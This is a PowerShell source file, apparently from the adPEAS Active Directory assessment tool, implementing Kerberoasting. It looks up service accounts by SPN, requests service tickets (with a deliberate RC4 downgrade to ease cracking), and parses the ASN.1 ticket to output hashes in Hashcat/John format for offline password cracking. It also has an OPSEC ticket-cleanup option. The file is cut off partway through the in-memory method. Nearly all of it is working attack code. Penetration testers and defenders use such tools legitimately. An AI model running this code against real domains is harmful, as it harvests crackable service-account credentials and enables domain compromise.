function Invoke-Kerberoast {
<#
.SYNOPSIS
    Kerberoasts a service account and extracts the TGS hash for offline cracking.

.DESCRIPTION
    This function requests a TGS ticket for a Service Principal Name (SPN) and extracts the TGS ticket hash in Hashcat/John format.

    Automatically selects the appropriate method based on authentication context:
    - Windows API (KerberosRequestorSecurityToken): When using Kerberos/SSPI auth
    - In-Memory Kerberoasting: When using SimpleBind with explicit credentials

    Supports multiple input methods:
    - Pipeline input from Get-DomainUser (recommended for bulk operations)
    - Direct SPN parameter (auto-resolves SAMAccountName via LDAP)
    - Direct SAMAccountName parameter (auto-resolves first SPN via LDAP)
    - Both SAMAccountName and SPN (no LDAP lookup needed)

    Encryption Types:
    - etype 23 (RC4-HMAC) = CRITICAL - Very fast to crack
    - etype 17 (AES128) = HIGH - Harder to crack
    - etype 18 (AES256) = MEDIUM - Strongest encryption

    Hash Format:
    - Output: $krb5tgs$etype$*user$realm$spn*$checksum$encrypted_part
    - Compatible with Hashcat (mode 13100 for RC4, 19700 for AES)
    - Compatible with John the Ripper

.PARAMETER InputObject
    A user object from Get-DomainUser (pipeline input). Must have sAMAccountName and servicePrincipalName properties.

.PARAMETER SAMAccountName
    The SAMAccountName of the service account. If SPN is not provided, the first SPN will be looked up via LDAP.

.PARAMETER SPN
    The Service Principal Name to request a TGS ticket for. If SAMAccountName is not provided, the account owning this SPN will be looked up via LDAP.

.PARAMETER Domain
    Target domain (optional, uses current domain if not specified)

.PARAMETER Server
    Domain Controller to query (optional, uses auto-discovery if not specified)

.PARAMETER Credential
    PSCredential object for authentication (optional, uses current user if not specified)

.PARAMETER Username
    Username for authentication. Must be used together with -Password.

.PARAMETER Password
    Password for authentication. Must be used together with -Username.

.PARAMETER CleanupTickets
    If specified, purges the requested ticket from cache after analysis (OPSEC).
    Only applies when using Windows API method.

.EXAMPLE
    # Pipeline from Get-DomainUser (recommended for bulk)
    Get-DomainUser -SPN | Invoke-Kerberoast

.EXAMPLE
    # Single account by SAMAccountName (looks up SPN)
    Invoke-Kerberoast -SAMAccountName "svc_sql"

.EXAMPLE
    # Single SPN (looks up SAMAccountName)
    Invoke-Kerberoast -SPN "MSSQLSvc/sql01.contoso.com:1433"

.EXAMPLE
    # Both parameters (no LDAP lookup)
    Invoke-Kerberoast -SAMAccountName "svc_sql" -SPN "MSSQLSvc/sql01.contoso.com:1433"

.EXAMPLE
    # With explicit credentials (forces in-memory method)
    Invoke-Kerberoast -SAMAccountName "svc_sql" -Credential (Get-Credential)

.OUTPUTS
    PSCustomObject with test results including encryption type, severity, and hash.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    Requires: Kerberos-Crypto.ps1 must be loaded (provides $Script:KERBEROS_ENCRYPTION_TYPES)
#>
    [CmdletBinding(DefaultParameterSetName='ByParameters')]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ByPipeline')]
        [PSCustomObject]$InputObject,

        [Parameter(Mandatory=$false, ParameterSetName='ByParameters')]
        [string]$SAMAccountName,

        [Parameter(Mandatory=$false, ParameterSetName='ByParameters')]
        [string]$SPN,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [string]$Username,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [switch]$CleanupTickets
    )

    begin {
        Write-Log "[Invoke-Kerberoast] Starting Kerberoast"

        # Validate dependency: $Script:KERBEROS_ENCRYPTION_TYPES must be defined
        if (-not $Script:KERBEROS_ENCRYPTION_TYPES) {
            Write-Error "[Invoke-Kerberoast] Required dependency missing: `$Script:KERBEROS_ENCRYPTION_TYPES not defined. Ensure Kerberos-Crypto.ps1 is loaded."
            return
        }

        # Build credential parameters for LDAP lookups, this is needed when running standalone without an active session
        $Script:KerberoastCredParams = @{}
        if ($Domain) { $Script:KerberoastCredParams['Domain'] = $Domain }
        if ($Server) { $Script:KerberoastCredParams['Server'] = $Server }
        if ($Credential) {
            $Script:KerberoastCredParams['Credential'] = $Credential
        } elseif ($Username -and $Password) {
            # Build PSCredential from Username/Password
            $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
            $Script:KerberoastCredParams['Credential'] = New-Object System.Management.Automation.PSCredential($Username, $securePassword)
        }

        # Determine Kerberoasting method based on authentication context
        # Windows API (KerberosRequestorSecurityToken): Requires valid TGT in ticket cache
        # In-Memory (own Kerberos stack): Uses credentials to request TGT + TGS on-the-fly
        $Script:UseInMemoryMethod = $false

        # If explicit credentials provided, use in-memory method
        if ($Credential -or ($Username -and $Password)) {
            $Script:UseInMemoryMethod = $true
            Write-Log "[Invoke-Kerberoast] Explicit credentials provided - using in-memory method"
        }
        # Check LDAP session auth method - non-Kerberos methods have no TGT in cache
        elseif ($Script:LDAPContext -and $Script:LDAPContext['AuthMethod']) {
            $sessionAuthMethod = $Script:LDAPContext['AuthMethod']
            # Only Windows API works for Kerberos-based auth (TGT is in the ticket cache)
            # For all other methods (SimpleBind, NTLM Impersonation), use in-memory if credentials available
            if ($sessionAuthMethod -in @('Kerberos', 'WindowsSSPI')) {
                Write-Log "[Invoke-Kerberoast] Kerberos auth detected ($sessionAuthMethod) - using Windows API method"
            }
            elseif ($Script:LDAPContext['Credential']) {
                $Script:UseInMemoryMethod = $true
                Write-Log "[Invoke-Kerberoast] Non-Kerberos auth ($sessionAuthMethod) with credentials - using in-memory method"
            }
            else {
                Write-Log "[Invoke-Kerberoast] Non-Kerberos auth ($sessionAuthMethod) without credentials - using Windows API method (may fail)"
            }
        }
        else {
            Write-Log "[Invoke-Kerberoast] No session info - using Windows Kerberos API method"
        }

        # Helper function to resolve SAMAccountName from SPN
         function Resolve-SPNOwner {
            param([string]$SPN)

            Write-Log "[Invoke-Kerberoast] Looking up SAMAccountName for SPN: $SPN"
            $user = @(Get-DomainUser -LDAPFilter "(servicePrincipalName=$SPN)" -Properties sAMAccountName @Script:KerberoastCredParams)[0]
            if ($user) {
                return $user.sAMAccountName
            }
            return $null
        }

        # Helper function to resolve first SPN from SAMAccountName
          function Resolve-UserSPN {
            param([string]$SAMAccountName)

            Write-Log "[Invoke-Kerberoast] Looking up SPNs for user: $SAMAccountName"
            $user = @(Get-DomainUser -Identity $SAMAccountName -Properties servicePrincipalName @Script:KerberoastCredParams)[0]
            if ($user -and $user.servicePrincipalName) {
                $spns = @($user.servicePrincipalName)
                return $spns[0]
            }
            return $null
        }

        if (-not $Script:UseInMemoryMethod) {
            # Add System.IdentityModel for Kerberos ticket requests
            try {
                Add-Type -AssemblyName System.IdentityModel -ErrorAction Stop
            } catch {
                Write-Error "[Invoke-Kerberoast] Failed to load System.IdentityModel assembly: $_"
                return
            }
        }
    }

    process {
        # Resolve effective SAMAccountName and SPN based on input method
        $effectiveSAMAccountName = $null
        $effectiveSPN = $null

        if ($PSCmdlet.ParameterSetName -eq 'ByPipeline') {
            # Pipeline input
            if (-not $InputObject.sAMAccountName) {
                Write-Warning "[Invoke-Kerberoast] Pipeline object missing sAMAccountName property"
                return
            }
            if (-not $InputObject.servicePrincipalName) {
                Write-Warning "[Invoke-Kerberoast] Pipeline object missing servicePrincipalName property"
                return
            }

            $effectiveSAMAccountName = $InputObject.sAMAccountName
            $spns = @($InputObject.servicePrincipalName)
            $effectiveSPN = $spns[0]

            Write-Log "[Invoke-Kerberoast] Pipeline input: $effectiveSAMAccountName with SPN $effectiveSPN"
        }
        else {
            # ByParameters - resolve missing values
            if ($SAMAccountName -and $SPN) {
                 $effectiveSAMAccountName = $SAMAccountName
                $effectiveSPN = $SPN
            }
            elseif ($SPN -and -not $SAMAccountName) {
                # Only SPN provided - lookup SAMAccountName
                $effectiveSPN = $SPN
                $effectiveSAMAccountName = Resolve-SPNOwner -SPN $SPN
                if (-not $effectiveSAMAccountName) {
                    Write-Warning "[Invoke-Kerberoast] Could not find account owning SPN: $SPN"
                    return [PSCustomObject]@{
                        SAMAccountName = "Unknown"
                        SPN = $SPN
                        Success = $false
                        EncryptionType = $null
                        EncryptionTypeName = $null
                        Severity = $null
                        HashcatMode = $null
                        Hash = $null
                        Error = "Could not resolve SAMAccountName for SPN"
                    }
                }
                Write-Log "[Invoke-Kerberoast] Resolved SAMAccountName '$effectiveSAMAccountName' for SPN '$SPN'"
            }
            elseif ($SAMAccountName -and -not $SPN) {
                # Only SAMAccountName provided - lookup first SPN
                $effectiveSAMAccountName = $SAMAccountName
                $effectiveSPN = Resolve-UserSPN -SAMAccountName $SAMAccountName
                if (-not $effectiveSPN) {
                    Write-Warning "[Invoke-Kerberoast] Account '$SAMAccountName' has no SPNs"
                    return [PSCustomObject]@{
                        SAMAccountName = $SAMAccountName
                        SPN = "None"
                        Success = $false
                        EncryptionType = $null
                        EncryptionTypeName = $null
                        Severity = $null
                        HashcatMode = $null
                        Hash = $null
                        Error = "Account has no servicePrincipalName"
                    }
                }
                Write-Log "[Invoke-Kerberoast] Using first SPN '$effectiveSPN' for account '$SAMAccountName'"
            }
            else {
                Write-Error "[Invoke-Kerberoast] Either -SAMAccountName, -SPN, or pipeline input required"
                return
            }
        }

        Write-Log "[Invoke-Kerberoast] Kerberoasting: $effectiveSAMAccountName / $effectiveSPN"

        # Route to appropriate method
        if ($Script:UseInMemoryMethod) {
            return Invoke-KerberoastInMemory -SAMAccountName $effectiveSAMAccountName -SPN $effectiveSPN -Domain $Domain -Server $Server -Credential $Credential -Username $Username -Password $Password
        }
        else {
            $apiResult = Invoke-KerberoastWindowsAPI -SAMAccountName $effectiveSAMAccountName -SPN $effectiveSPN -CleanupTickets:$CleanupTickets

            # If Windows API failed with a credentials/NetworkCredentials error AND the session has
            # stored credentials (e.g. PTT session from non-domain-member), fall back to in-memory method
            if (-not $apiResult.Success -and $apiResult.Error -match 'NetworkCredentials|TGT in cache|Re-authenticate') {
                if ($Script:LDAPContext -and $Script:LDAPContext['Credential']) {
                    Write-Log "[Invoke-Kerberoast] Windows API failed (NetworkCredentials), falling back to in-memory method using session credentials"
                    return Invoke-KerberoastInMemory -SAMAccountName $effectiveSAMAccountName -SPN $effectiveSPN -Domain $Domain -Server $Server -Credential $Script:LDAPContext['Credential']
                }
            }

            return $apiResult
        }
    }

    end {
        Write-Log "[Invoke-Kerberoast] Kerberoast completed"
    }
}

#region Internal: Windows API Method
function Invoke-KerberoastWindowsAPI {
    param(
        [string]$SAMAccountName,
        [string]$SPN,
        [switch]$CleanupTickets
    )

    Write-Log "[Invoke-KerberoastWindowsAPI] Using Windows Kerberos API for $SPN"

    try {
        # Step 1: Request TGS ticket using System.IdentityModel and extract it directly
        # The KerberosRequestorSecurityToken contains the ticket - we extract it via GetRequest()
        Write-Log "[Invoke-KerberoastWindowsAPI] Requesting TGS ticket for $SPN"

        $KerberosToken = $null
        $TicketBytes = $null

        try {
            $KerberosToken = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN

            # Extract the raw ticket from the token using GetRequest()
            # GetRequest() returns the AP-REQ which contains the ticket
            $ApReqBytes = $KerberosToken.GetRequest()

            if ($ApReqBytes -and $ApReqBytes.Length -gt 0) {
                Write-Log "[Invoke-KerberoastWindowsAPI] Got AP-REQ of $($ApReqBytes.Length) bytes"

                # Parse AP-REQ to extract the Ticket
                # AP-REQ ::= [APPLICATION 14] SEQUENCE { ... ticket [3] Ticket ... }
                $TicketBytes = Get-TicketFromApReq -ApReqBytes $ApReqBytes

                if (-not $TicketBytes) {
                    throw "Failed to extract Ticket from AP-REQ"
                }

                Write-Log "[Invoke-KerberoastWindowsAPI] Extracted ticket of $($TicketBytes.Length) bytes from AP-REQ"
            } else {
                throw "GetRequest() returned empty AP-REQ"
            }
        } catch {
            Write-Log "[Invoke-KerberoastWindowsAPI] Failed to request/extract ticket: $_"

            # Analyze error to provide user-friendly message
            $errorMessage = $_.Exception.Message
            $innerMessage = if ($_.Exception.InnerException) { $_.Exception.InnerException.Message } else { $null }
            $fullError = if ($innerMessage) { "$errorMessage - $innerMessage" } else { $errorMessage }

            # Check for common error patterns and provide helpful guidance
            $userFriendlyError = $null

            # No TGT in cache (most common after klist purge or expired tickets)
            if ($fullError -match 'NetworkCredentials|unable to create.*Kerberos credential|No credentials are available') {
                $userFriendlyError = "No valid Kerberos TGT in cache. Re-authenticate with Connect-adPEAS or use -Credential parameter for in-memory Kerberoasting."
            }
            # Target principal not found (SPN doesn't exist)
            elseif ($fullError -match 'target principal name is incorrect|cannot find') {
                $userFriendlyError = "SPN not found or unreachable: $SPN"
            }
            # KDC unreachable
            elseif ($fullError -match 'KDC.*unavailable|cannot contact|network path') {
                $userFriendlyError = "Cannot contact KDC. Check network connectivity and DNS."
            }

            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                SPN = $SPN
                Success = $false
                EncryptionType = $null
                EncryptionTypeName = $null
                Severity = $null
                HashcatMode = $null
                Hash = $null
                Error = if ($userFriendlyError) { $userFriendlyError } else { "TGS request failed: $fullError" }
            }
        }

        # Step 2: Parse ticket to extract EncryptionType and hash
        $EncryptionType = $null
        $EncryptionTypeName = $null
        $Severity = $null
        $HashcatMode = $null
        $TicketHash = $null
        $TicketFound = $false

        # Get realm name with proper null check and uppercase for Kerberos
        $RealmName = "UNKNOWN"
        if ($Script:LDAPContext -and $Script:LDAPContext.distinguishedName) {
            $RealmName = ($Script:LDAPContext.distinguishedName -replace 'DC=','' -replace ',','.').ToUpper()
        } elseif ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
            $RealmName = $Script:LDAPContext.Domain.ToUpper()
        }

        if ($TicketBytes -and $TicketBytes.Length -gt 0) {
            $TicketFound = $true

            # Extract EncryptionType from the ASN.1-encoded ticket
            $EncryptionType = Get-EncryptionTypeFromTicket -TicketBytes $TicketBytes

            if ($EncryptionType) {
                Write-Log "[Invoke-KerberoastWindowsAPI] Extracted etype $EncryptionType from ticket ASN.1"

                # Cast to [int] for hashtable lookup
                $etypeInt = [int]$EncryptionType
                if ($Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($etypeInt)) {
                    $EncryptionTypeName = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt].Name
                    $Severity = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt].Severity
                    $HashcatMode = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt].HashcatMode
                } else {
                    $EncryptionTypeName = "Unknown (etype $etypeInt)"
                    $Severity = "Unknown"
                }
            } else {
                Write-Log "[Invoke-KerberoastWindowsAPI] Could not extract etype from ticket"
            }

            # Extract hash using centralized function
            $TicketHash = Get-KerberosTicketHash -TicketBytes $TicketBytes -EncryptionType $EncryptionType -UserName $SAMAccountName -Realm $RealmName -SPN $SPN -TicketType "TGS"

            if ($TicketHash) {
                Write-Log "[Invoke-KerberoastWindowsAPI] Successfully extracted hash (length: $($TicketHash.Length) chars)"
            }
        }

        # Build result
        $Result = [PSCustomObject]@{
            SAMAccountName = $SAMAccountName
            SPN = $SPN
            Success = $TicketFound
            EncryptionType = $EncryptionType
            EncryptionTypeName = $EncryptionTypeName
            Severity = $Severity
            HashcatMode = $HashcatMode
            Hash = $TicketHash
            Error = if (-not $TicketFound) { "Failed to extract ticket" } else { $null }
        }

        # Add description if available
        if ($EncryptionType -and $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey([int]$EncryptionType)) {
            $Result | Add-Member -NotePropertyName "Description" -NotePropertyValue $Script:KERBEROS_ENCRYPTION_TYPES[[int]$EncryptionType].Description
        }

        # Optional: Cleanup of requested ticket (OPSEC)
        if ($CleanupTickets) {
            Write-Log "[Invoke-KerberoastWindowsAPI] CleanupTickets requested"
            Write-Warning "[Invoke-Kerberoast] CleanupTickets requested but selective deletion not supported by klist. Use 'klist purge' manually if full cleanup is intended."
        }

        return $Result

    } catch {
        Write-Log "[Invoke-KerberoastWindowsAPI] Error testing SPN $SPN : $_"
        return [PSCustomObject]@{
            SAMAccountName = $SAMAccountName
            SPN = $SPN
            Success = $false
            EncryptionType = $null
            EncryptionTypeName = $null
            Severity = $null
            HashcatMode = $null
            Hash = $null
            Error = $_.Exception.Message
        }
    }
}

# Helper function to extract Ticket from GSS-API wrapped AP-REQ or raw AP-REQ
function Get-TicketFromApReq {
    param([byte[]]$ApReqBytes)

    try {
        # KerberosRequestorSecurityToken.GetRequest() returns a GSS-API InitialContextToken
        # Structure: [APPLICATION 0] SEQUENCE { OID, AP-REQ }
        # The AP-REQ is: [APPLICATION 14] SEQUENCE { pvno, msg-type, ap-options, ticket, authenticator }

        $offset = 0

        # Check if this is GSS-API wrapped (0x60 = APPLICATION 0)
        if ($ApReqBytes[$offset] -eq 0x60) {
            Write-Log "[Get-TicketFromApReq] Detected GSS-API wrapper (0x60)"
            $offset++

            # Skip GSS-API APPLICATION 0 length
            if ($ApReqBytes[$offset] -band 0x80) {
                $lenBytes = $ApReqBytes[$offset] -band 0x7F
                $offset += 1 + $lenBytes
            } else {
                $offset++
            }

            # Skip OID (0x06 = OBJECT IDENTIFIER for Kerberos: 1.2.840.113554.1.2.2)
            if ($ApReqBytes[$offset] -eq 0x06) {
                $offset++
                $oidLen = $ApReqBytes[$offset]
                $offset += 1 + $oidLen
                Write-Log "[Get-TicketFromApReq] Skipped OID ($oidLen bytes)"
            }

            # Now we should be at the AP-REQ token type (0x01 0x00 for AP-REQ in GSS-API)
            # Some implementations have a 2-byte token type prefix
            if ($offset + 2 -lt $ApReqBytes.Length -and $ApReqBytes[$offset] -eq 0x01 -and $ApReqBytes[$offset + 1] -eq 0x00) {
                $offset += 2
                Write-Log "[Get-TicketFromApReq] Skipped GSS-API token type (01 00)"
            }
        }

        # Now we should be at the AP-REQ [APPLICATION 14] (0x6E)
        if ($ApReqBytes[$offset] -ne 0x6E) {
            Write-Log "[Get-TicketFromApReq] Expected AP-REQ (0x6E), got 0x$($ApReqBytes[$offset].ToString('X2')) at offset $offset"
            return $null
        }

        Write-Log "[Get-TicketFromApReq] Found AP-REQ at offset $offset"
        $offset++

        # Skip AP-REQ APPLICATION length
        if ($ApReqBytes[$offset] -band 0x80) {
            $lenBytes = $ApReqBytes[$offset] -band 0x7F
            $offset += 1 + $lenBytes
        } else {
            $offset++
        }

        # Now at SEQUENCE (0x30)
        if ($ApReqBytes[$offset] -ne 0x30) {
            Write-Log "[Get-TicketFromApReq] Expected SEQUENCE after AP-REQ tag"
            return $null
        }
        $offset++

        # Skip SEQUENCE length
        if ($ApReqBytes[$offset] -band 0x80) {
            $lenBytes = $ApReqBytes[$offset] -band 0x7F
            $offset += 1 + $lenBytes
        } else {
            $offset++
        }

        # Search for context tag [3] (0xA3) which contains the ticket
        while ($offset -lt $ApReqBytes.Length - 10) {
            $tag = $ApReqBytes[$offset]

            if ($tag -eq 0xA3) {
                # Found ticket context tag [3]
                $offset++

                # Read context tag length
                $ticketWrapperLen = 0
                if ($ApReqBytes[$offset] -band 0x80) {
                    $lenBytes = $ApReqBytes[$offset] -band 0x7F
                    $offset++
                    for ($i = 0; $i -lt $lenBytes; $i++) {
                        $ticketWrapperLen = ($ticketWrapperLen -shl 8) -bor $ApReqBytes[$offset + $i]
                    }
                    $offset += $lenBytes
                } else {
                    $ticketWrapperLen = $ApReqBytes[$offset]
                    $offset++
                }

                # The content is the Ticket structure starting with [APPLICATION 1] (0x61)
                if ($ApReqBytes[$offset] -eq 0x61) {
                    # Copy the entire Ticket structure
                    $ticketBytes = New-Object byte[] $ticketWrapperLen
                    [Array]::Copy($ApReqBytes, $offset, $ticketBytes, 0, $ticketWrapperLen)
                    Write-Log "[Get-TicketFromApReq] Extracted Ticket ($ticketWrapperLen bytes)"
                    return $ticketBytes
                } else {
                    Write-Log "[Get-TicketFromApReq] Expected Ticket (0x61), got 0x$($ApReqBytes[$offset].ToString('X2'))"
                    return $null
                }
            }

            # Skip this element and move to next
            $offset++
            if ($offset -lt $ApReqBytes.Length) {
                $elementLen = 0
                if ($ApReqBytes[$offset] -band 0x80) {
                    $lenBytes = $ApReqBytes[$offset] -band 0x7F
                    $offset++
                    for ($i = 0; $i -lt $lenBytes; $i++) {
                        if ($offset + $i -lt $ApReqBytes.Length) {
                            $elementLen = ($elementLen -shl 8) -bor $ApReqBytes[$offset + $i]
                        }
                    }
                    $offset += $lenBytes + $elementLen
                } else {
                    $elementLen = $ApReqBytes[$offset]
                    $offset += 1 + $elementLen
                }
            }
        }

        Write-Log "[Get-TicketFromApReq] Ticket not found in AP-REQ"
        return $null
    }
    catch {
        Write-Log "[Get-TicketFromApReq] Error parsing: $_"
        return $null
    }
}

# Helper function to extract EncryptionType from ASN.1-encoded Kerberos ticket
function Get-EncryptionTypeFromTicket {
    param([byte[]]$TicketBytes)

    try {
        # The ticket is: [APPLICATION 1] SEQUENCE { tkt-vno, realm, sname, enc-part }
        # enc-part is: [3] EncryptedData
        # EncryptedData is: SEQUENCE { etype [0] Int32, kvno [1] UInt32 OPTIONAL, cipher [2] OCTET STRING }

        $offset = 0

        # Skip APPLICATION 1 tag (0x61)
        if ($TicketBytes[$offset] -ne 0x61) {
            Write-Log "[Get-EncryptionTypeFromTicket] Not a Ticket structure (expected 0x61, got 0x$($TicketBytes[$offset].ToString('X2')))"
            return $null
        }
        $offset++

        # Skip length
        if ($TicketBytes[$offset] -band 0x80) {
            $lenBytes = $TicketBytes[$offset] -band 0x7F
            $offset += 1 + $lenBytes
        } else {
            $offset++
        }

        # Now at SEQUENCE tag (0x30)
        if ($TicketBytes[$offset] -ne 0x30) {
            Write-Log "[Get-EncryptionTypeFromTicket] Expected SEQUENCE (0x30), got 0x$($TicketBytes[$offset].ToString('X2'))"
            return $null
        }
        $offset++

        # Skip SEQUENCE length
        if ($TicketBytes[$offset] -band 0x80) {
            $lenBytes = $TicketBytes[$offset] -band 0x7F
            $offset += 1 + $lenBytes
        } else {
            $offset++
        }

        # Search for context tag [3] (0xA3) which contains enc-part
        while ($offset -lt $TicketBytes.Length - 10) {
            if ($TicketBytes[$offset] -eq 0xA3) {
                # Found enc-part context tag
                $offset++

                # Skip length
                if ($TicketBytes[$offset] -band 0x80) {
                    $lenBytes = $TicketBytes[$offset] -band 0x7F
                    $offset += 1 + $lenBytes
                } else {
                    $offset++
                }

                # Now at EncryptedData SEQUENCE (0x30)
                if ($TicketBytes[$offset] -ne 0x30) {
                    Write-Log "[Get-EncryptionTypeFromTicket] Expected EncryptedData SEQUENCE"
                    return $null
                }
                $offset++

                # Skip SEQUENCE length
                if ($TicketBytes[$offset] -band 0x80) {
                    $lenBytes = $TicketBytes[$offset] -band 0x7F
                    $offset += 1 + $lenBytes
                } else {
                    $offset++
                }

                # Now at etype context tag [0] (0xA0)
                if ($TicketBytes[$offset] -ne 0xA0) {
                    Write-Log "[Get-EncryptionTypeFromTicket] Expected etype context tag (0xA0)"
                    return $null
                }
                $offset++

                # Skip length
                if ($TicketBytes[$offset] -band 0x80) {
                    $lenBytes = $TicketBytes[$offset] -band 0x7F
                    $offset += 1 + $lenBytes
                } else {
                    $offset++
                }

                # Now at INTEGER (0x02)
                if ($TicketBytes[$offset] -ne 0x02) {
                    Write-Log "[Get-EncryptionTypeFromTicket] Expected INTEGER for etype"
                    return $null
                }
                $offset++

                # Read integer length
                $intLen = $TicketBytes[$offset]
                $offset++

                # Read integer value
                $etype = 0
                for ($i = 0; $i -lt $intLen; $i++) {
                    $etype = ($etype -shl 8) -bor $TicketBytes[$offset + $i]
                }

                Write-Log "[Get-EncryptionTypeFromTicket] Found etype: $etype"
                return $etype
            }

            # Skip this element
            $offset++
            if ($offset -lt $TicketBytes.Length -and ($TicketBytes[$offset] -band 0x80)) {
                $lenBytes = $TicketBytes[$offset] -band 0x7F
                if ($lenBytes -gt 0 -and ($offset + 1 + $lenBytes) -lt $TicketBytes.Length) {
                    $elementLen = 0
                    for ($i = 0; $i -lt $lenBytes; $i++) {
                        $elementLen = ($elementLen -shl 8) -bor $TicketBytes[$offset + 1 + $i]
                    }
                    $offset += 1 + $lenBytes + $elementLen
                } else {
                    $offset++
                }
            } elseif ($offset -lt $TicketBytes.Length) {
                $elementLen = $TicketBytes[$offset]
                $offset += 1 + $elementLen
            }
        }

        Write-Log "[Get-EncryptionTypeFromTicket] enc-part not found in ticket"
        return $null
    }
    catch {
        Write-Log "[Get-EncryptionTypeFromTicket] Error parsing ticket: $_"
        return $null
    }
}
#endregion

#region Internal: In-Memory Method
function Invoke-KerberoastInMemory {
    param(
        [string]$SAMAccountName,
        [string]$SPN,
        [string]$Domain,
        [string]$Server,
        [System.Management.Automation.PSCredential]$Credential,
        [string]$Username,
        [string]$Password
    )

    Write-Log "[Invoke-KerberoastInMemory] Using in-memory Kerberoast for $SPN"

    # Track sensitive data for cleanup
    $securePassword = $null
    $tgtResult = $null

    try {
        # Step 0: Resolve Domain from parameter or LDAPContext
        $targetDomain = $Domain
        if (-not $targetDomain -and $Script:LDAPContext -and $Script:LDAPContext.Domain) {
            $targetDomain = $Script:LDAPContext.Domain
            Write-Log "[Invoke-KerberoastInMemory] Using domain from LDAP session: $targetDomain"
        }

        # Validate domain is available
        if (-not $targetDomain) {
            throw "Domain not specified. Use -Domain parameter or connect with Connect-adPEAS first."
        }

        # Step 1: Resolve Server (priority: parameter > LDAPContext > auto-discovery)
        $targetServer = $Server
        if (-not $targetServer -and $Script:LDAPContext -and $Script:LDAPContext.Server) {
            $targetServer = $Script:LDAPContext.Server
            Write-Log "[Invoke-KerberoastInMemory] Using server from LDAP session: $targetServer"
        }
        if (-not $targetServer) {
            # Auto-discover domain controller
            Write-Log "[Invoke-KerberoastInMemory] No server specified, attempting auto-discovery..."
            $dcResolution = Resolve-adPEASName -Domain $targetDomain
            if ($dcResolution -and $dcResolution.Hostname) {
                $targetServer = $dcResolution.Hostname
                Write-Log "[Invoke-KerberoastInMemory] Auto-discovered server: $targetServer"
            } else {
                throw "Could not resolve domain controller for '$targetDomain'. Use -Server parameter or connect with Connect-adPEAS first."
            }
        }

        $realmUpper = $targetDomain.ToUpper()

        # Step 2: Resolve credentials (priority: Credential > Username/Password > LDAPContext)
        $effectiveCredential = $null

        if ($Credential) {
            # Explicit PSCredential takes priority
            $effectiveCredential = $Credential
            Write-Log "[Invoke-KerberoastInMemory] Using explicit PSCredential"
        }
        elseif ($Username -and $Password) {
            # Create PSCredential from Username/Password
            $securePass = ConvertTo-SecureString -String $Password -AsPlainText -Force
            $effectiveCredential = [System.Management.Automation.PSCredential]::new($Username, $securePass)
            Write-Log "[Invoke-KerberoastInMemory] Using Username/Password credentials"
        }
        elseif ($Script:LDAPContext -and $Script:LDAPContext['Credential']) {
            # Fall back to LDAP session credentials
            $effectiveCredential = $Script:LDAPContext['Credential']
            Write-Log "[Invoke-KerberoastInMemory] Using credentials from existing LDAP session"
        }
        else {
            throw "No credentials available. Use -Credential, -Username/-Password parameters, or connect with Connect-adPEAS -Credential first."
        }

        # Extract username from credential for Kerberos
        $authUserName = $effectiveCredential.UserName
        if ($authUserName -match '\\') {
            $authUserName = $authUserName.Split('\')[1]
        }
        if ($authUserName -match '@') {
            $authUserName = $authUserName.Split('@')[0]
        }

        # Step 3: Request TGT using our Kerberos stack (in-memory only!)
        Write-Log "[Invoke-KerberoastInMemory] Requesting TGT for $authUserName"

        $tgtResult = Invoke-KerberosAuth -UserName $authUserName -Domain $targetDomain -DomainController $targetServer -Credential $effectiveCredential

        if (-not $tgtResult.Success) {
            throw "Failed to obtain TGT: $($tgtResult.Error)"
        }

        Write-Log "[Invoke-KerberoastInMemory] TGT obtained (etype $($tgtResult.EncryptionType))"

        # Step 4: Request TGS with RC4 downgrade attempt
        $tgsResult = $null
        $lastError = $null

        # Request with RC4 only - KDC will return the weakest etype the service account supports
        # If service account has RC4 disabled, KDC may either:
        # - Return ETYPE_NOSUPP error (then we try AES)
        # - Return ticket with AES anyway (then we use what we got)
        try {
            Write-Log "[Invoke-KerberoastInMemory] Requesting RC4 (etype 23) for $SPN"

            $tgsResult = Request-ServiceTicket -TGT $tgtResult.TicketBytes `
                                               -SessionKey $tgtResult.SessionKeyBytes `
                                               -SessionKeyType $tgtResult.EncryptionType `
                                               -ServicePrincipalName $SPN `
                                               -Domain $targetDomain `
                                               -DomainController $targetServer `
                                               -UserName $authUserName `
                                               -DowngradeToRC4

            # If RC4 request failed with ETYPE_NOSUPP, try without downgrade (offer all etypes)
            if (-not $tgsResult.Success -and $tgsResult.Error -match 'ETYPE_NOSUPP') {
                Write-Log "[Invoke-KerberoastInMemory] RC4 not supported, trying AES..."

                $tgsResult = Request-ServiceTicket -TGT $tgtResult.TicketBytes `
                                                   -SessionKey $tgtResult.SessionKeyBytes `
                                                   -SessionKeyType $tgtResult.EncryptionType `
                                                   -ServicePrincipalName $SPN `
                                                   -Domain $targetDomain `
                                                   -DomainController $targetServer `
                                                   -UserName $authUserName
            }

            if ($tgsResult.Success) {
                Write-Log "[Invoke-KerberoastInMemory] Got ticket with etype $($tgsResult.EncryptionType) for $SPN"
            } else {
                $lastError = $tgsResult.Error
            }
        }
        catch {
            $lastError = $_.Exception.Message
        }

        Write-Log "[Invoke-KerberoastInMemory] TGT discarded (in-memory only, not persisted)"

        # Process the result
        if ($tgsResult -and $tgsResult.Success) {
            # Extract hash from ticket using centralized function
            # IMPORTANT: Use SAMAccountName (service account owner), NOT authUserName (requesting user)
            # The hash contains the service account whose password we want to crack
            $hash = Get-KerberosTicketHash -TicketBytes $tgsResult.TicketBytes `
                                           -EncryptionType $tgsResult.EncryptionType `
                                           -UserName $SAMAccountName `
                                           -Realm $realmUpper `
                                           -SPN $SPN `
                                           -TicketType "TGS"

            # Defensive check for encryption types hashtable
